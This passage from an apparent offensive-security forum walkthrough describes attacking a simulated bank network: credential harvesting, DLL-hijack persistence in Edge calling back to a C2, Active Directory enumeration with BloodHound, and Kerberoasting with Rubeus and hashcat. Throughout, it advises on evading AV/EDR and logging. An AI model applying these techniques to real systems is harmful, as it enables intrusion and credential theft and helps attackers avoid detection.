<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/0/a0a79b538b3286edf6812fb7525d51a3b6c02361.png" data-download-href="/uploads/short-url/mVdurEexUhgTTQZhowJX2SLQRB7.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/a/0/a0a79b538b3286edf6812fb7525d51a3b6c02361_2_624x500.png" alt="" data-base62-sha1="mVdurEexUhgTTQZhowJX2SLQRB7" width="624" height="500" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/a/0/a0a79b538b3286edf6812fb7525d51a3b6c02361_2_624x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/a/0/a0a79b538b3286edf6812fb7525d51a3b6c02361_2_936x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/a/0/a0a79b538b3286edf6812fb7525d51a3b6c02361.png 2x" data-dominant-color="32343F"></a></div><p></p>
<p>Some interesting info is to see what the user has accessed recently, maybe some interesting websites were visited where the user is asked for credentials, interesting files where user information is worked upon. It can be quite interesting the files that were recently accessed</p>
<p>We can also have a look at using our Custom Tool, I’ve built a small POC using C# that does quite similar searches like Seatbelt but I added some little other things such as finding some privesc opportunities.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/e/dedfad870927949e5f81b33baa02fc9bafac9132.png" data-download-href="/uploads/short-url/vNDe0Lq7ZzMmzwK8YcJ7dcM64RY.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/e/dedfad870927949e5f81b33baa02fc9bafac9132_2_690x265.png" alt="" data-base62-sha1="vNDe0Lq7ZzMmzwK8YcJ7dcM64RY" width="690" height="265" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/e/dedfad870927949e5f81b33baa02fc9bafac9132_2_690x265.png, https://0x00sec.s3.amazonaws.com/original/3X/d/e/dedfad870927949e5f81b33baa02fc9bafac9132.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/e/dedfad870927949e5f81b33baa02fc9bafac9132.png 2x" data-dominant-color="3A3C47"></a></div><p></p>
<p>From the enumeration we can notice that the user visits certain sites frequently during work hours it can be quite interesting some of the finds.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/6/d69aea905dd5fccbaf8a5beb3819b20dccd6e1c1.png" alt="" data-base62-sha1="uCu5hG0nQ8oPeOLxKdFbJVlz4bL" width="590" height="156" role="presentation"></p>
<p>Might be able to find credentials, let’s take a look.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/6/e65742a325dddbcce12aa15ec5c324f281d14deb.png" data-download-href="/uploads/short-url/wRGLTDqwwbL10klU3sSR5m9VDPJ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e65742a325dddbcce12aa15ec5c324f281d14deb_2_690x179.png" alt="" data-base62-sha1="wRGLTDqwwbL10klU3sSR5m9VDPJ" width="690" height="179" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e65742a325dddbcce12aa15ec5c324f281d14deb_2_690x179.png, https://0x00sec.s3.amazonaws.com/original/3X/e/6/e65742a325dddbcce12aa15ec5c324f281d14deb.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/6/e65742a325dddbcce12aa15ec5c324f281d14deb.png 2x" data-dominant-color="2D303C"></a></div><p></p>
<p>Nice, some credentials and it seems to be for the Local HelpDesk account info that was shown when I used my POC, I could’ve simply used simple CMD commands, but we have no clue if the Command Line is being logged so it’s best to use some custom tools that use API to call for information here I called to check which users are in the local Administrator group.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/e/deb6f4a43a7b20d93f28e2ae34f9db5f41149487.png" alt="" data-base62-sha1="vMdYHy4mKQBuZXnvstgCdIPMsUn" width="509" height="90" role="presentation"></p>
<p>Since we found some Local Administrator credentials we can move on our persistence, we got some great information.</p>
<p>One easy place to leave persistence is in the Startup Folder as previously mentioned but it’s not the most OPSEC considered method but a very simple one. The file left behind will execute every time the user logs back onto its session it’s nice to verify who we are.</p>
<p>But we are going to take a different approach and will use a stealthier approach as we have Administrator Privileges, we can intercept execution on a DLL of our choice without affecting the original process.</p>
<p>In this example the user works with Microsoft Edge in the work environment, the technique will be implementing is Koppeling [16] the techniques allows you to prepare any arbitrary DLL for hijacking as long as we provided the final path of the reference DLL, which in our case its a DLL loaded by Edge named dbghelp.dll we can see this DLL is being loaded in an Edge path Location by using Procmon and applying the “NAME NOT FOUND” and CreateFile Filters for the tool.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/c/fc1fe53a7ef095256d5999f267ba6810be992807.png" data-download-href="/uploads/short-url/zYoEO3zfIERdQweBm8mQBjnlkkT.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/c/fc1fe53a7ef095256d5999f267ba6810be992807_2_690x13.png" alt="" data-base62-sha1="zYoEO3zfIERdQweBm8mQBjnlkkT" width="690" height="13" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/c/fc1fe53a7ef095256d5999f267ba6810be992807_2_690x13.png, https://0x00sec.s3.amazonaws.com/original/3X/f/c/fc1fe53a7ef095256d5999f267ba6810be992807.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/c/fc1fe53a7ef095256d5999f267ba6810be992807.png 2x" data-dominant-color="4C9DDE"></a></div><p></p>
<p>For building the exports and proper payload we need to give it the target payload and the referenced payload (which is the one we want to copy its exports from). I used the C# binary for this.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/f/2f6706f8e79ea2556b03cc583f1c22982c14db64.png" data-download-href="/uploads/short-url/6LlaUkE879xmzYWN76qnwzskBPS.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/f/2f6706f8e79ea2556b03cc583f1c22982c14db64_2_690x105.png" alt="" data-base62-sha1="6LlaUkE879xmzYWN76qnwzskBPS" width="690" height="105" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/f/2f6706f8e79ea2556b03cc583f1c22982c14db64_2_690x105.png, https://0x00sec.s3.amazonaws.com/original/3X/2/f/2f6706f8e79ea2556b03cc583f1c22982c14db64.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/f/2f6706f8e79ea2556b03cc583f1c22982c14db64.png 2x" data-dominant-color="161616"></a></div><p></p>
<p>Placing the DLL into the proper location when loading edge will not break its functionality and crash the binary where there might be some sort of investigation. Make sure to use quotes if the path contains a blank space in a folder name such as “Program Files.”</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/0/a06cb077a2417f2bc4fe2a784a03f4af665aad50.png" data-download-href="/uploads/short-url/mTbgbA7L91gpv5X0NicnouZ4AX6.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/0/a06cb077a2417f2bc4fe2a784a03f4af665aad50.png" alt="" data-base62-sha1="mTbgbA7L91gpv5X0NicnouZ4AX6" width="690" height="194" role="presentation" data-dominant-color="181B1D"></a></div><p></p>
<p>We can verify our call back to our C2.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/c/ec9f97e121385e4fa2ad4fecb67cf3b7f53c00a5.png" data-download-href="/uploads/short-url/xLgBP1NQwYqtO7288hs7N4gdb6J.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/c/ec9f97e121385e4fa2ad4fecb67cf3b7f53c00a5_2_690x100.png" alt="" data-base62-sha1="xLgBP1NQwYqtO7288hs7N4gdb6J" width="690" height="100" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/c/ec9f97e121385e4fa2ad4fecb67cf3b7f53c00a5_2_690x100.png, https://0x00sec.s3.amazonaws.com/original/3X/e/c/ec9f97e121385e4fa2ad4fecb67cf3b7f53c00a5.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/c/ec9f97e121385e4fa2ad4fecb67cf3b7f53c00a5.png 2x" data-dominant-color="30323F"></a></div><p></p>
<p>With this method of persistence, we are confident that it will not crash the process and actually run under the radar when executing this happens because AV/EDR take in consideration that a legitimate process is being executed so this way we are also aware on when the user is active, since we won’t get a call back unless the user executes Edge.</p>
<p>This does come with some things to consider, that we need to move fast onto another process as we did previously when we injected to get our tools working, we need to be careful as if the user closes Edge our connection will die as well and of course will just have to wait until the next execution for that, but we got stuff to do!!</p>
<p>[1] <a href="https://www.malwarebytes.com/blog/threat-intelligence/2022/01/patchwork-apt-caught-in-its-own-web" class="inline-onebox" rel="noopener nofollow ugc">Patchwork APT caught in its own web</a></p>
<p>[2] <a href="https://persistence-info.github.io/" rel="noopener nofollow ugc">https://persistence-info.github.io/</a></p>
<p>[3] <a href="https://www.linkedin.com/pulse/qbot-zerologon-lead-full-domain-compromise-reza-adineh/" class="inline-onebox" rel="noopener nofollow ugc">Qbot and Zerologon Lead to Full Domain Compromise</a></p>
<p>[4] <a href="https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa" class="inline-onebox" rel="noopener nofollow ugc">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) | by Adam Toscher | Medium</a></p>
<p>[5] <a href="https://m365internals.com/2021/11/08/kerberoast-with-opsec/" class="inline-onebox" rel="noopener nofollow ugc">Kerberoast with OpSec | Microsoft 365 Security</a></p>
<p>[6] <a href="https://www.setquotes.com/give-me-six-hours-to-chop-down-a-tree/" rel="noopener nofollow ugc">https://www.setquotes.com/give-me-six-hours-to-chop-down-a-tree/</a></p>
<p>[7] <a href="https://notes.vulndev.io/wiki/redteam/active-directory" class="inline-onebox" rel="noopener nofollow ugc">Active Directory - Notes</a></p>
<p>[8] <a href="https://0xd4y.com/2023/02/28/Active-Directory-Pentesting-Notes/" class="inline-onebox" rel="noopener nofollow ugc">Active Directory Pentesting Notes</a></p>
<p>[9] <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" class="inline-onebox" rel="noopener nofollow ugc">Active Directory Methodology - HackTricks</a></p>
<p>[10] <a href="https://adsecurity.org/" rel="noopener nofollow ugc">https://adsecurity.org/</a></p>
<p>[11] <a href="https://notes.morph3.blog/windows/recon-initial-access" class="inline-onebox" rel="noopener nofollow ugc">Recon - Initial Access - Pentesting &amp; Red Teaming Notes</a></p>
<p>[12] <a href="https://www.ired.team/" rel="noopener nofollow ugc">https://www.ired.team/</a></p>
<p>[13] <a href="https://ppn.snovvcrash.rocks/" rel="noopener nofollow ugc">https://ppn.snovvcrash.rocks/</a></p>
<p>[14] <a href="https://github.com/Flangvik/SharpCollection" class="inline-onebox" rel="noopener nofollow ugc">GitHub - Flangvik/SharpCollection: Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.</a></p>
<p>[15] <a href="https://github.com/GhostPack/Seatbelt" class="inline-onebox" rel="noopener nofollow ugc">GitHub - GhostPack/Seatbelt: Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.</a></p>
<p>[16] <a href="https://github.com/monoxgas/Koppeling" class="inline-onebox" rel="noopener nofollow ugc">GitHub - monoxgas/Koppeling: Adaptive DLL hijacking / dynamic export forwarding</a></p>
<p><strong>Lateral Movement, Active Directory, Kerberoasting and SQL Servers</strong></p>
<p>As we keep enumerating the Host Machine we notice we are at a dead end there is a whole network of workstations and we need to keep moving to look for more interesting data at the bank, we need to reach domain admin to at least say we PWNED the bank we need to focus a little longer on the Active Directory this time, will move onto using the SharpView tool this will allow us to stay in memory using the C2 Framework, unfortunately persistent PowerShell scripts are still not available at this time this way we could have utilized PowerView for Havoc but you can still utilize the popular scripts available for Domain Enumeration as well.</p>
<p>Finding AD information is quite important now that we need to get around the network, we need Computer Names, User Names, Permissions, Access anything that we can use as a means to know where to move next or if we have permissions to move around [1].</p>
<p>For this we need to know first where we are again now but in the Active Directory, we know the host and user we are currently working with but what is the Domains name? Are there more Computers connected? Devices? Users? Let’s look at the Domain.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/e/0e3ca189690422e2b56a6eefb7ef4dd0a2082275.png" data-download-href="/uploads/short-url/21WAkf0meWY0pXo45anGpfUVgcR.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e3ca189690422e2b56a6eefb7ef4dd0a2082275_2_690x191.png" alt="" data-base62-sha1="21WAkf0meWY0pXo45anGpfUVgcR" width="690" height="191" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e3ca189690422e2b56a6eefb7ef4dd0a2082275_2_690x191.png, https://0x00sec.s3.amazonaws.com/original/3X/0/e/0e3ca189690422e2b56a6eefb7ef4dd0a2082275.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/e/0e3ca189690422e2b56a6eefb7ef4dd0a2082275.png 2x" data-dominant-color="2E313C"></a></div><p></p>
<p>Ok now we are familiar with the Domain name of the Active Directory and there seems to be no other child domains that we might need to pivot to let’s look now at the users maybe there is info on them that we can rely on to move laterally.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/7/c7402b347bdc79b16078f225e609c0713fa9f2f0.png" data-download-href="/uploads/short-url/sqEuQFQR9JMHgs2U44oJ90zuymk.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c7402b347bdc79b16078f225e609c0713fa9f2f0_2_690x264.png" alt="" data-base62-sha1="sqEuQFQR9JMHgs2U44oJ90zuymk" width="690" height="264" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c7402b347bdc79b16078f225e609c0713fa9f2f0_2_690x264.png, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c7402b347bdc79b16078f225e609c0713fa9f2f0.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c7402b347bdc79b16078f225e609c0713fa9f2f0.png 2x" data-dominant-color="2C2F3A"></a></div><p></p>
<p>We have a quick list on users that are available in the Domain this enumeration I just asked for the names of the users, but I can request the full information on each user individually if I see someone interesting for this I would need to request the samaccountname property so I can use the “-Identity” parameter on SharpView and properly request all the info for that user.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/2/227b4fbd01435f3c05e223d6226af9a8cc4d809c.png" data-download-href="/uploads/short-url/4V2qvLjkpNoXW9VhRdSJUUcLEde.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/2/227b4fbd01435f3c05e223d6226af9a8cc4d809c_2_690x250.png" alt="" data-base62-sha1="4V2qvLjkpNoXW9VhRdSJUUcLEde" width="690" height="250" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/2/227b4fbd01435f3c05e223d6226af9a8cc4d809c_2_690x250.png, https://0x00sec.s3.amazonaws.com/original/3X/2/2/227b4fbd01435f3c05e223d6226af9a8cc4d809c.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/2/227b4fbd01435f3c05e223d6226af9a8cc4d809c.png 2x" data-dominant-color="2C2F3A"></a></div><p></p>
<p>Now let’s just grab the identity of 1 user considering we don’t want to send a bunch of queries to the DC in a short amount of time as this will get us flagged, one of the good things about SharpView is that it’s using legitimate LDAP traffic.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/6/46a0550acfe56ead6f7e90cff8bc01cb4902e808.png" data-download-href="/uploads/short-url/a4MVQKwbpLkIwycwUM6LovRAKak.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/6/46a0550acfe56ead6f7e90cff8bc01cb4902e808_2_690x443.png" alt="" data-base62-sha1="a4MVQKwbpLkIwycwUM6LovRAKak" width="690" height="443" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/6/46a0550acfe56ead6f7e90cff8bc01cb4902e808_2_690x443.png, https://0x00sec.s3.amazonaws.com/original/3X/4/6/46a0550acfe56ead6f7e90cff8bc01cb4902e808.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/6/46a0550acfe56ead6f7e90cff8bc01cb4902e808.png 2x" data-dominant-color="2F313D"></a></div><p></p>
<p>We see above that Adrian is a Domain Admin[2][3] but we can’t move here yet, we got no info on the user besides he’s a Domain Admin and no permissions really stand out we also need to find a way to reach him, now we do have a bunch of active directory techniques that we can work on[4] but instead of guessing we can actually get a path on us for where to go next, here comes bloodhound[5] with this</p>
<p>Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. And true to that since it would take us some time to recognize the patterns and paths for us to move on the network so we can automate and find this using BloodHound with the easy .NET Binary we can run this all in-memory as well so no worries on leaving artifacts on the host, let’s run this.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/2/a2377386550a2ad7f98164081889f38a7dca8ce9.png" data-download-href="/uploads/short-url/n929y0jNeY3FgYPSgMlXaY4Ofix.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/a/2/a2377386550a2ad7f98164081889f38a7dca8ce9_2_690x223.png" alt="" data-base62-sha1="n929y0jNeY3FgYPSgMlXaY4Ofix" width="690" height="223" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/a/2/a2377386550a2ad7f98164081889f38a7dca8ce9_2_690x223.png, https://0x00sec.s3.amazonaws.com/original/3X/a/2/a2377386550a2ad7f98164081889f38a7dca8ce9.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/a/2/a2377386550a2ad7f98164081889f38a7dca8ce9.png 2x" data-dominant-color="2F313D"></a></div><p></p>
<p>Beautiful lets see what happened here, I added some extra parameters because we want to be stealthy right?</p>
<p>I change the default values of some actions such as throttle, jitter and threads, because we aren’t in a hurry, one of my favorite things about this is that it now tells you which version of BH is it compatible to, so no more guessing on the version, the status interval was unnecessary but I wanted to show the progress of the tool so I just upped it up a notch so that we receive the output a little more slower, I avoided the cache to be written to disk and kept solely in memory, as well as encrypted the Zip File so AV/EDR doesn’t have access to our graph and renamed the ZIP File so it doesn’t look like a standard bloodhound created zip file, now let’s setup BloodHound and import the Graph.</p>
<p>Setting up bloodhound shouldn’t be complicated install Neo4J, build an empty DB and start bloodhound after neo4j then importing the zip file should be easy.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/7/c724a94c7fce4f5146258f8c4989cbcefc99bea4.png" data-download-href="/uploads/short-url/spHyUIGZMu5lpt7nQdJG9UBEOTW.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c724a94c7fce4f5146258f8c4989cbcefc99bea4_2_690x338.png" alt="" data-base62-sha1="spHyUIGZMu5lpt7nQdJG9UBEOTW" width="690" height="338" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c724a94c7fce4f5146258f8c4989cbcefc99bea4_2_690x338.png, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c724a94c7fce4f5146258f8c4989cbcefc99bea4.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c724a94c7fce4f5146258f8c4989cbcefc99bea4.png 2x" data-dominant-color="F0F2F6"></a></div><p></p>
<p>Now I have to take a look at the Computers in the Domain since we are trying to move onto another host or if possible, impersonate another user while searching we find an interesting one a SQL Workstation, let’s take a more detailed look at this Node.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/b/7b11701000f94678ea36776e364587f9aa2ae12e.png" data-download-href="/uploads/short-url/hyI5wlsEcR5uVeUFb9Kb5mtnM5w.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7b11701000f94678ea36776e364587f9aa2ae12e_2_690x363.png" alt="" data-base62-sha1="hyI5wlsEcR5uVeUFb9Kb5mtnM5w" width="690" height="363" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7b11701000f94678ea36776e364587f9aa2ae12e_2_690x363.png, https://0x00sec.s3.amazonaws.com/original/3X/7/b/7b11701000f94678ea36776e364587f9aa2ae12e.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/b/7b11701000f94678ea36776e364587f9aa2ae12e.png 2x" data-dominant-color="EAECEF"></a></div><p></p>
<p>Seems that we do have some paths to reach this Workstation, but the problem is that:</p>
<ul>
<li>We need a Domain Admin</li>
<li>We need to reach DC.</li>
</ul>
<p>Let’s check if any user has a way to reach out to this workstation, which we see that one of the users does have a SPN tied to them and it links back to the DBSQL workstation this doesn’t guarantee that the user has a way to access the workstation but only the SQL Instance, but taking in consideration that SQL is also a treasure trove of opportunities let’s work with it.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/b/3b0ece3ec2a0f4e0bbc421526dfd3a640ebb98fb.png" data-download-href="/uploads/short-url/8qrThIfyILUAAYEvppny2z1KAf9.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b0ece3ec2a0f4e0bbc421526dfd3a640ebb98fb_2_690x481.png" alt="" data-base62-sha1="8qrThIfyILUAAYEvppny2z1KAf9" width="690" height="481" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b0ece3ec2a0f4e0bbc421526dfd3a640ebb98fb_2_690x481.png, https://0x00sec.s3.amazonaws.com/original/3X/3/b/3b0ece3ec2a0f4e0bbc421526dfd3a640ebb98fb.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/b/3b0ece3ec2a0f4e0bbc421526dfd3a640ebb98fb.png 2x" data-dominant-color="EAEBED"></a></div><p></p>
<p>Now we could have checked this as well utilizing SharpView and the SPN parameter that will look for users that have a Service Principal Name attached to them which this means that users are Kerberoastable[6][7] in this case we can request a ticket and crack it offline, this works because, ANY user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with the RC4 using the password hash of the service account assigned the requested SPN as the key.</p>
<p>A good OPSEC method is to use “<em>Rubeus kerberoast /stats”</em> this won’t query the user’s and will look for only SPN tied to an account using LDAP.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/8/18b36f5a64bfc1f40f0220d3e49cad48cf1a9712.png" data-download-href="/uploads/short-url/3wvTBRHWHQjl7veOV9sosVf3j8u.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/8/18b36f5a64bfc1f40f0220d3e49cad48cf1a9712_2_690x132.png" alt="" data-base62-sha1="3wvTBRHWHQjl7veOV9sosVf3j8u" width="690" height="132" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/8/18b36f5a64bfc1f40f0220d3e49cad48cf1a9712_2_690x132.png, https://0x00sec.s3.amazonaws.com/original/3X/1/8/18b36f5a64bfc1f40f0220d3e49cad48cf1a9712.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/8/18b36f5a64bfc1f40f0220d3e49cad48cf1a9712.png 2x" data-dominant-color="31333F"></a></div><p></p>
<p>Let’s request a ticket for the user utilizing Rubeus and crack the hash offline. Something I do want you to consider is Do not request tickets for the ENTIRE Domain, research your targets, it’s super important to hide in the logs if we aren’t disabling these or tampering with, I will show below a single Kerberoast Request on a Sea of Logs which can be taken as a benign action.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/2/82e20424a86080a3ace19c5d6726d93649862516.png" data-download-href="/uploads/short-url/iFQj8g2mJzKPbBV8WWic5SvrxB4.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/8/2/82e20424a86080a3ace19c5d6726d93649862516_2_690x329.png" alt="" data-base62-sha1="iFQj8g2mJzKPbBV8WWic5SvrxB4" width="690" height="329" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/8/2/82e20424a86080a3ace19c5d6726d93649862516_2_690x329.png, https://0x00sec.s3.amazonaws.com/original/3X/8/2/82e20424a86080a3ace19c5d6726d93649862516.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/8/2/82e20424a86080a3ace19c5d6726d93649862516.png 2x" data-dominant-color="2D2F3A"></a></div><p></p>
<p>But we can also use our C2s built-in get-spns which does not leave a log 4769 log:</p>
<p>Havoc:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d7f0c87d67a0bb31b1889f9894745ee04f64e08d.png" data-download-href="/uploads/short-url/uOiwXPR1EB07xCydppAmTPw67SJ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/7/d7f0c87d67a0bb31b1889f9894745ee04f64e08d_2_690x238.png" alt="" data-base62-sha1="uOiwXPR1EB07xCydppAmTPw67SJ" width="690" height="238" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/7/d7f0c87d67a0bb31b1889f9894745ee04f64e08d_2_690x238.png, https://0x00sec.s3.amazonaws.com/original/3X/d/7/d7f0c87d67a0bb31b1889f9894745ee04f64e08d.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/7/d7f0c87d67a0bb31b1889f9894745ee04f64e08d.png 2x" data-dominant-color="2E303C"></a></div><p></p>
<p>Havoc Logs:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/8/e862209211dfd7e1f5709504bc274159ad13311c.png" data-download-href="/uploads/short-url/x9L0BwEjIt58rpiMJoOoGuoIhkw.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/8/e862209211dfd7e1f5709504bc274159ad13311c_2_690x434.png" alt="" data-base62-sha1="x9L0BwEjIt58rpiMJoOoGuoIhkw" width="690" height="434" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/8/e862209211dfd7e1f5709504bc274159ad13311c_2_690x434.png, https://0x00sec.s3.amazonaws.com/original/3X/e/8/e862209211dfd7e1f5709504bc274159ad13311c.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/8/e862209211dfd7e1f5709504bc274159ad13311c.png 2x" data-dominant-color="DADFE3"></a></div><p></p>
<p>Rubeus Logs:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/d/9d38addc3a018aac7b7fd7edc4b4e8bd1c1534ef.png" data-download-href="/uploads/short-url/mqQoDslOxyezZs4BBnBfIxC8u87.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/d/9d38addc3a018aac7b7fd7edc4b4e8bd1c1534ef_2_613x500.png" alt="" data-base62-sha1="mqQoDslOxyezZs4BBnBfIxC8u87" width="613" height="500" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/d/9d38addc3a018aac7b7fd7edc4b4e8bd1c1534ef_2_613x500.png, https://0x00sec.s3.amazonaws.com/original/3X/9/d/9d38addc3a018aac7b7fd7edc4b4e8bd1c1534ef.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/d/9d38addc3a018aac7b7fd7edc4b4e8bd1c1534ef.png 2x" data-dominant-color="DEE1E3"></a></div><p></p>
<p>We notice that Madison requested a ticket for Joselin, but this is a simple, single request that has the potential to hide in the logs or can be the only hint left behind that the network was even compromised while Havoc does a better job in hiding as we just see Logon status which can blend with the rest of the logs. Let’s move on to Cracking this hash will use hashcat [9] for that.</p>
<p><em>hashcat.exe -m 13100 -a 0 hashes wordlist</em></p>
<ul>
<li>Type of hash</li>
<li>Attack method</li>
<li>Hash file</li>
<li>Wordlist to utilize.
<ul>
<li>Extra: Use rules to mutate words (password, p4$$w0rd)</li>
</ul>
</li>
</ul>
